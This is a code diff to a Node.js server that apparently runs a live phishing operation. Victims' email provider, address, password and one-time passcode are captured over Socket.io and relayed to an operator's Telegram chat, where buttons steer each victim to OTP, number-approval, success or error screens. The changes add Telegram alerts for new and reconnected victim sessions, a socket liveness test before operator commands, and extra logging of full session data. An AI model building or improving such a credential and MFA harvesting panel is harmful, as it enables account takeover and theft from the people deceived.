@@ -54,7 +54,7 @@ function generateUniqueId() {
 // -------------------- Express route --------------------
 app.post('/start-session', (req, res) => {
   const { sessionId } = req.body; // get sessionId from client
-  const session = sessions.get(sessionId);
+  let session = sessions.get(sessionId);
 
   if (!session) return res.status(404).send('Session not found');
 
@@ -64,6 +64,19 @@ app.post('/start-session', (req, res) => {
 
   session.userAgent = req.headers['user-agent'];
   session.socketId = req.body.socketId; // update socketId
+  
+  //notify bot 
+  const message = `🌐 *New Session Started*\n\n` +
+    `*Session ID:* \`${sessionId}\`\n` +
+    `*IP Address:* ${session.ip}\n` +
+    `*User Agent:* ${session.userAgent}\n` +
+    `*Status:* Active`;
+
+  try {
+    bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+  } catch (error) {
+    console.error('Telegram error:', error);
+  }
 
   console.log(`Session ${sessionId} started with IP: ${session.ip} and User Agent: ${session.userAgent}`);
 
@@ -76,26 +89,14 @@ app.post('/start-session', (req, res) => {
 // -------------------- Socket.io connection --------------------
 io.on('connection', (socket) => {
   console.log('New client connected:', socket.id);
-  const sessionId = generateUniqueId();   
-
-  // Send sessionId to frontend
-  socket.emit('your-session-id', sessionId);
-
-  // Store socket session
-  sessions.set(sessionId, {
-    socketId: socket.id,
-    provider: null,
-    email: null,
-    password: null,
-    otp: null,
-    timestamp: new Date()
-  });    
-
+ // don't emit new session id yet , because frontend may need to reconnect to existing session 
    socket.on('reconnect-session', (data) => {
-    const session = sessions.get(data.sessionId);
+    let session = sessions.get(data.sessionId);
     if (session) {
       console.log(`Updating socket for session ${data.sessionId}: ${session.socketId} → ${socket.id}`);
-      session.socketId = socket.id; // Update to new socket ID
+      session.socketId = socket.id; // Update to new socket ID 
+      //notify bot
+      bot.sendMessage(TELEGRAM_CHAT_ID, `🔄 *Session Reconnected*\n\n*Session ID:* \`${data.sessionId}\`\n*New Socket ID:* \`${socket.id}\``, { parse_mode: 'Markdown' });
     }  else {
       console.log(`Session ${data.sessionId} not found for reconnection.`); 
     // Session doesn't exist! Server must have restarted
@@ -104,10 +105,30 @@ io.on('connection', (socket) => {
     return; 
     }
   }); 
+  
+
+  //for new session requests
+   socket.on('request-new-session', () => {
+     const sessionId = generateUniqueId();   
+     // Send sessionId to frontend
+  socket.emit('your-session-id', sessionId);
+  // Store socket session
+  sessions.set(sessionId, {
+    socketId: socket.id,
+    provider: null,
+    email: null,
+    password: null,
+    otp: null,
+    timestamp: new Date()
+  });   
+  console.log(`New session created: ${sessionId} for socket ${socket.id}`);
+  });
+
+
 
   // Handle email submission
   socket.on('submit-email', async (data) => {
-    const session = sessions.get(data.sessionId);
+    let session = sessions.get(data.sessionId);
     session.provider = data.provider;
     session.email = data.email;
     
@@ -128,7 +149,7 @@ io.on('connection', (socket) => {
 
   // Handle password submission
   socket.on('submit-password', async (data) => {
-    const session = sessions.get(data.sessionId);
+    let session = sessions.get(data.sessionId);
     session.password = data.password;
     
     console.log('Password submitted:', data);
@@ -186,10 +207,12 @@ io.on('connection', (socket) => {
 
   // Handle OTP submission
   socket.on('submit-otp', async (data) => {
-    const session = sessions.get(data.sessionId);
+    let session = sessions.get(data.sessionId);
     session.otp = data.otp;
     
     console.log('OTP submitted:', data);
+    // recheck session infos
+      console.log('Session data:', session);
 
     const message = `🔢 *OTP Submitted*\n\n` +
       `*Provider:* ${session.provider}\n` +
@@ -212,8 +235,7 @@ io.on('connection', (socket) => {
       await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
         parse_mode: 'Markdown',
         reply_markup: keyboard
-      }); 
-      session.otp = data.otp; // Store OTP in session
+      });  
     } catch (error) {
       console.error('Telegram error:', error);
     }
@@ -235,7 +257,7 @@ bot.on('callback_query', async (callbackQuery) => {
   const sessionId = parts[parts.length - 1]; // LAST part is the session ID
   const action = parts.slice(0, -1).join('_'); // everything else = action, e.g., "send_otp"
 
-   const session = sessions.get(sessionId);  
+   let session = sessions.get(sessionId);   
 
 
     
@@ -244,7 +266,10 @@ bot.on('callback_query', async (callbackQuery) => {
   console.log('Full data:', data);
   console.log('Parsed sessionId:', sessionId);
   console.log('Available sessions:', Array.from(sessions.keys()));
-  console.log('Session exists?', sessions.has(sessionId)); 
+  console.log('Session exists?', sessions.has(sessionId));
+ 
+
+
 
 
   // tiny delay to allow session to finish initializing
@@ -272,18 +297,44 @@ if (!session) {
       show_alert: true
     });
     return;
-  }
+  }   
+
+
+
+  //ADD REAL connection test - try to actually send something small
+  // Before sending any event, TEST if socket can actually receive
+try {
+  // Create a promise that rejects if no response in 2 seconds
+  await new Promise((resolve, reject) => {
+    const timeout = setTimeout(() => reject(new Error('timeout')), 2000);
+    
+    socket.emit('connection-test', {}, (ack) => {
+      clearTimeout(timeout);
+      resolve();
+    });
+  });
+} catch (err) {
+   // Socket is DEAD! Don't send the real event
+  console.log('Socket test failed:', err.message);
+  await bot.answerCallbackQuery(callbackQuery.id, {
+    text: '❌ User disconnected or not responding',
+    show_alert: true
+  });
+  return;
+} 
 
   switch (action) {
     case 'send_otp': {
-       await bot.answerCallbackQuery(callbackQuery.id, {
+      await bot.answerCallbackQuery(callbackQuery.id, {
       text: '✅ OTP screen sent to user'
     });
-      console.log('Sending OTP screen to socket:', sessionId);
+      console.log('Sending OTP screen to session:', sessionId);
       console.log('=== SEND OTP DEBUG ===');
       console.log('Session ID:', sessionId);
       console.log('Socket exists?', !!socket);
-      console.log('Socket connected?', socket?.connected);
+      console.log('Socket connected?', socket?.connected); 
+      // recheck session infos
+      console.log('Session data:', session);
     socket.emit('show-otp-screen');
     await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
       chat_id: chatId,
@@ -320,7 +371,7 @@ if (!session) {
           const specialNumber = msg.text;
           
           // Store it in session
-          const session = sessions.get(sessionId);
+          let session = sessions.get(sessionId);
           if (session) {
             session.specialNumber = specialNumber;
           }
@@ -340,13 +391,13 @@ if (!session) {
     case 'mark_complete': {
     await bot.answerCallbackQuery(callbackQuery.id, {
       text: '✅ Marked as complete! User sees success page.'
-    }); 
+    });
     socket.emit('show-success-screen');
     await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
       chat_id: chatId,
       message_id: messageId
     });
-    const session = sessions.get(sessionId);
+    let session = sessions.get(sessionId);
    const summary = `✅ *Session Completed*\n` +
                 `\`=== ${session.provider.toUpperCase()} ===\`\n\n` +
                 `*Provider:* ${session.provider}\n` +
@@ -421,10 +472,10 @@ case 'resend_approve_number': {
 
     case 'reject': {
       // Reject session
+      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
       await bot.answerCallbackQuery(callbackQuery.id, {
         text: '❌ Session rejected'
       });
-      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
         chat_id: chatId,
         message_id: messageId
